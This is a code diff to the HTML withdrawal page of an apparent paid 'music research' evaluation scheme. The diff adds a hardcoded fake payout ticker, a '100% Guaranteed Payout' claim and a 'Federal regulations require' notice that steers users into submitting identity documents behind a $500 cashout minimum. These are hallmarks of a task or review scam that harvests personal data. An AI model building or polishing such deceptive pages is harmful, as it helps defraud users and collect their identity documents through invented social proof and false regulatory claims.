@@ -1321,8 +1321,31 @@
     <div class="page-inner">
       <div class="withdraw-hero">
         <p class="withdraw-hero-label">Available Balance</p>
-        <p class="withdraw-hero-amount">$<span id="withdrawBalance">0.00</span></p>
-        <p class="withdraw-hero-sub">Minimum cashout: $500.00 · identity verification required</p>
+        <p class="withdraw-hero-amount">$<span id="withdrawBalance">0.00</span> USD</p>
+        <p class="withdraw-hero-sub">● 100% Guaranteed Payout Clearing</p>
+      </div>
+
+      <!-- PAYOUT DESTINATION STATUS -->
+      <div class="bank-status-card" id="bankStatusCard">
+        <div class="no-bank-wrap" id="noBankWrap">
+          <svg class="no-bank-icon" viewBox="0 0 24 24"><path d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm14-12v7h3v-7h-3zm-4.5-9L2 6v2h19V6l-9.5-5z"/></svg>
+          <div class="no-bank-title">No Payout Destination Linked</div>
+          <div class="no-bank-desc">Federal regulations require a verified payout account and identity documents before submitting withdrawals.</div>
+          <button class="add-bank-btn" onclick="openKycModal()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#000"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            + Add Payout Method
+          </button>
+        </div>
+        <div class="linked-bank-wrap" id="linkedBankWrap">
+          <div class="linked-bank-info">
+            <div class="linked-bank-icon" id="linkedBankIcon">🅿️</div>
+            <div>
+              <div class="linked-bank-name" id="linkedBankName">PayPal Account</div>
+              <div class="linked-bank-meta">✓ Verified for Payout Clearance</div>
+            </div>
+          </div>
+          <button class="change-bank-link" onclick="openKycModal()">Change</button>
+        </div>
       </div>
 
       <!-- Withdrawal review tracker -->
@@ -1336,28 +1359,41 @@
         <div class="sp-steps" id="spKycSteps"></div>
       </div>
 
-      <div class="paypal-logo-row">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" style="height:34px; width:auto; flex-shrink:0">
-        <div class="paypal-logo-text">PayPal Withdrawal<small>Released after document approval</small></div>
-      </div>
-      <form class="withdraw-form" onsubmit="submitWithdraw(event)">
+      <!-- CASHOUT FORM -->
+      <div class="withdraw-form-card">
         <div class="form-group">
-          <label class="form-label">PayPal Email</label>
-          <input class="form-input" id="paypalEmail" type="email" placeholder="your@email.com" required>
-          <span class="form-hint">Enter your verified PayPal email address</span>
+          <label class="form-label">Payout Account (PayPal e-mail)</label>
+          <input type="email" class="form-input" id="paypalEmail" placeholder="your@email.com">
         </div>
         <div class="form-group">
-          <label class="form-label">Amount (USD)</label>
-          <input class="form-input" id="withdrawAmount" type="number" min="500" step="0.01" placeholder="e.g. 500.00" required>
-          <span class="form-hint" id="maxHint">Max available: $0.00</span>
-          <span class="form-hint">Minimum withdrawal: $500.00</span>
+          <label class="form-label">Withdrawal Amount (USD)</label>
+          <input type="text" class="form-input" id="withdrawAmount" placeholder="$0.00" readonly>
+          <span class="form-hint" id="maxHint">Minimum cashout: $500.00</span>
         </div>
-        <button class="withdraw-submit-btn" type="submit" id="withdrawBtn">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
-          Transfer via PayPal
+        <button class="withdraw-submit-btn" id="withdrawBtn" onclick="requestWithdrawalRef()">
+          Request Withdrawal
         </button>
-        <p class="security-note">🔒 256-bit SSL encrypted · PayPal protected</p>
-      </form>
+        <p class="security-note">🔒 256-bit SSL encrypted · compliance reviewed</p>
+      </div>
+
+      <!-- SOCIAL PROOF LIVE TICKER -->
+      <div class="social-payout-ticker" id="socialTicker">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#1DB954"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        <span id="tickerText">Michael R. (Austin, TX) cashed out $840.20 via PayPal</span>
+      </div>
+
+      <div class="transactions-card">
+        <div style="padding: 14px 18px 6px; font-size: 11px; font-weight: 800; color: #777; text-transform: uppercase; letter-spacing: 1px;">Recent Activity</div>
+        <div id="transactionsList">
+          <div class="menu-item">
+            <div>
+              <strong style="color: #fff;">Evaluation earnings</strong>
+              <small style="display: block; color: #888;">Music research program</small>
+            </div>
+            <span style="color: #1DB954; font-weight: 800;" id="txEarned">$0.00 USD</span>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- KYC / account details sheet -->
